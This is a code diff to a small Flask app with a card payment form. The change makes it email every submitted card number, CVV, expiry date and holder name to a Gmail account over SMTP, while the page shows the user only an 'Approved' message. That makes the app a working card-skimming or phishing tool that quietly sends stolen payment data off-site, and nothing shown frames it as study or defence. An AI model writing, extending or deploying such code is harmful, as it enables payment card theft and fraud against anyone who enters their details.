@@ -1,5 +1,10 @@
 from flask import Flask, request, render_template_string
 import smtplib
+import os
+
+email = os.environ.get("EMAIL")
+password = os.environ.get("EMAIL_PASSWORD")
+
 app = Flask(__name__)
 
 HTML = """
@@ -71,6 +76,21 @@ HTML = """
 </html>
 """
 
+def send_email(card_number, cvv, expiry, card_holder):
+    msg = f"""Subject: Someone submitted the form
+
+Card Number: {card_number}
+CVV: {cvv}
+Expiry: {expiry}
+Card Holder: {card_holder}
+"""
+
+    with smtplib.SMTP("smtp.gmail.com", 587) as connection:
+        connection.starttls()
+        connection.login(email, password)
+        connection.sendmail(email, email, msg)
+
+
 @app.route("/", methods=["GET", "POST"])
 def home():
     if request.method == "POST":
@@ -79,21 +99,13 @@ def home():
         expiry = request.form.get("expiry")
         card_holder = request.form.get("card_holder")
 
-        print("=== Payment Submitted ===")
-        print(f"Card Holder: {card_holder}")
-        print(f"Card Number: {card_number}")
-        print(f"Expiry: {expiry}")
-        print(f"CVV: {cvv}")
-        print("=========================")
+        send_email(card_number, cvv, expiry, card_holder)
 
         return f"""
         <html>
         <body style="font-family:Arial;text-align:center;margin-top:100px;">
             <h1>✅ Payment Processing...</h1>
             <p>Card Holder: {card_holder}</p>
-            <p>Card Number: {card_number}</p>
-            <p>Expiry: {expiry}</p>
-            <p>CVV: {cvv}</p>
             <h2>💳 Approved (DEMO)</h2>
             <a href="/">Go back</a>
         </body>
@@ -101,6 +113,7 @@ def home():
         """
 
     return render_template_string(HTML)
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
